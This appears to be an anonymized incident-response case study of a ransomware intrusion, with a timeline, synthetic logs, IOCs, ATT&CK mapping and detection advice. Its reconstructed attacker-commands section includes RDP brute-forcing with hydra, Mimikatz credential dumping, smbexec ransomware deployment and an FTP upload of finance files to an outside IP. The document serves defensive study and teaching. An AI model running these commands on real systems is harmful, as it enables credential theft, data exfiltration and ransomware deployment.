ğŸ›¡ Human-Operated Ransomware (Anonymized)
ğŸ“Œ Executive Summary

This case describes a multi-stage ransomware incident.
The attacker gained access via an exposed RDP service, escalated to domain admin, moved laterally with Cobalt Strike, and deployed ransomware domain-wide through Group Policy.
They also exfiltrated sensitive files before encryption.

ğŸ¯ Outcome: confirmed data exfiltration, ransomware deployment at scale, and delayed detection.

____________________________________________________________________________________________

## ğŸ–¼ Attack Flow (ASCII Diagram)

                     +-------------------+
                     |   Attacker Host   |
                     +-------------------+
                               |
                               v
                     +-------------------+
                     | ğŸ”´ RDP brute-force |
                     +-------------------+
                               |
                               v
                     +-----------------------+
                     | Initial Workstation   |
                     +-----------------------+
                               |
                               v
                 +----------------------------+
                 | ğŸŸ¡ LSASS dump (Mimikatz)   |
                 +----------------------------+
                               |
                               v
                     +-----------------------+
                     | Domain Admin Creds    |
                     +-----------------------+
                               |
                               v
                     +-----------------------+
                     | ğŸ”´ Cobalt Strike      |
                     |     beacon            |
                     +-----------------------+
                               |
                               v
                     +-----------------------+
                     |   Domain Controller   |
                     +-----------------------+
                        /              \
                       /                \
                      v                  v
   +---------------------------+   +----------------------+
   | ğŸ”´ Group Policy Push      |   | ğŸŸ¢ FTP Exfiltration  |
   +---------------------------+   +----------------------+
              |
              v
   +---------------------------+
   | ğŸ”’ Endpoints Encrypted    |
   +---------------------------+

____________________________________________________________________________________________

ğŸ“– Attack Narrative

ğŸ¥· Stage 1 â€“ Initial Access & Escalation

ğŸ”´ RDP brute-force â†’ successful login to exposed server.

ğŸŸ¡ LSASS dump with Mimikatz recovered cached domain admin creds.

ğŸŸ¡ Attacker used DLL hijack for persistence on initial host.


ğŸ›  Stage 2 â€“ Lateral Movement & Recon

ğŸ”´ Cobalt Strike beacon deployed for C2.

ğŸŸ¡ Lateral movement via SMB + stolen credentials.

ğŸŸ¢ Recon with PowerView and net group "Domain Admins".


ğŸ’¥ Stage 3 â€“ Ransomware Deployment & Exfiltration

ğŸ”´ Group Policy Object (GPO) modified to push ransomware binary.

ğŸŸ¢ Exfiltration of sensitive finance files via FTP.

ğŸ”’ Ransomware executed â†’ encrypted endpoints, ransom note deployed.

____________________________________________________________________________________________

â±ï¸ Timeline (UTC)
Time	Event
00:00	ğŸ”´ RDP brute-force successful login
01:05	ğŸŸ¡ LSASS dump performed, creds extracted
01:45	ğŸ”´ Cobalt Strike beacon active
03:20	ğŸŸ¢ Recon with PowerView + domain map created
04:00	ğŸ”´ Group Policy modified â†’ ransomware distributed
04:20	ğŸŸ¢ FTP session opened, ~3GB data exfiltrated
06:00	ğŸ”’ Ransomware executed across endpoints

____________________________________________________________________________________________

ğŸ“‚ Artifacts (Synthetic / Anonymized)

Windows Security Log (Event ID 4624 â€“ RDP Login):

{
  "time": "2025-06-10T00:00:11Z",
  "eventID": 4624,
  "targetUser": "Administrator",
  "logonType": 10,
  "srcIP": "185.203.55.77",
  "workstation": "SRV-RDP01"
}

Sysmon LSASS Dump Detection:

{
  "time": "2025-06-10T01:05:31Z",
  "eventSource": "Sysmon",
  "process": "mimikatz.exe",
  "target": "lsass.exe",
  "action": "memory dump"
}

FTP Exfiltration Log:

{
  "time": "2025-06-10T04:21:12Z",
  "protocol": "FTP",
  "srcHost": "DC01.internal.local",
  "dstIP": "91.214.44.91",
  "filesTransferred": "Finance_Q2_2025.zip (2.9GB)"
}

Ransom Note (sample content):

Your files are encrypted.
Contact us at: darkteam@onionmail.org
BTC wallet: 1C5smT3pB2k4...

____________________________________________________________________________________________

ğŸ’» Attacker Commands (Reconstructed, Synthetic)

# Brute-force RDP (attacker side)
hydra -l administrator -P rockyou.txt rdp://victim.company.com

# LSASS dump with Mimikatz
mimikatz.exe "sekurlsa::logonpasswords"

# Reconnaissance
powershell -exec bypass -c "Import-Module .\PowerView.ps1; Get-NetDomainTrust"

# Deploy ransomware via GPO
smbexec.py corp/admin:Password123@DC01 cmd.exe /c "\\share\ransom.exe"

# Exfiltration
ftp -inv 91.214.44.91 <<EOF
put Finance_Q2_2025.zip
EOF

____________________________________________________________________________________________

ğŸ§¾ IOCs (Synthetic)

| Type      | Value                                                   | Source         | Status    |
| --------- | ------------------------------------------------------- | -------------- | --------- |
| ğŸŒ IP     | 185.203.55.77                                           | RDP logon      | Malicious |
| ğŸŒ IP     | 91.214.44.91                                            | FTP exfil      | Malicious |
| ğŸ›  Binary | mimikatz.exe (SHA256: a1b2c3â€¦)                          | Sysmon logs    | Malicious |
| ğŸ›  Binary | ransomware.exe (SHA256: d4e5f6â€¦)                        | GPO deployment | Malicious |
| ğŸ“§ Email  | [darkteam@onionmail.org](mailto:darkteam@onionmail.org) | Ransom note    | Malicious |

____________________________________________________________________________________________

ğŸ—‚ï¸ MITRE ATT&CK Mapping

T1210 â€“ Exploitation of Remote Services (RDP)

T1003 â€“ OS Credential Dumping (LSASS / Mimikatz)

T1071.001 â€“ Application Layer Protocol (Cobalt Strike C2)

T1069 â€“ Permission Group Discovery (PowerView)

T1486 â€“ Data Encrypted for Impact (Ransomware)

T1020 â€“ Automated Exfiltration (FTP)

____________________________________________________________________________________________

ğŸ‘€ Detection Use Cases

ğŸš¨ Alert on external RDP logins with unusual geolocation.

ğŸš¨ Monitor LSASS access events (EDR / Sysmon).

ğŸš¨ Detect Cobalt Strike beacon IOCs (named pipes, SMB traffic).

ğŸš¨ Audit & alert on GPO modifications outside change window.

ğŸš¨ Detect outbound FTP traffic to rare destinations.

ğŸš¨ Alert on mass file access + rapid encryption.

____________________________________________________________________________________________

ğŸ›¡ï¸ Response Actions

âŒ Disabled compromised accounts.

ğŸ”’ Blocked malicious RDP access at firewall.

ğŸ›‘ Stopped GPO ransomware push, revoked domain admin tokens.

ğŸ“‘ Performed forensic imaging of DC + endpoints.

ğŸ“¢ Communicated incident impact to leadership.

____________________________________________________________________________________________

ğŸ›¡ï¸ Recommendations

Block or restrict RDP; enforce MFA for admins.

Harden LSASS (Credential Guard, Protected Process Light).

Audit & alert on Group Policy changes.

Monitor outbound data exfiltration attempts.

Deploy ransomware-specific behavioral detections in SIEM/EDR.

Perform regular tabletop exercises for ransomware IR.
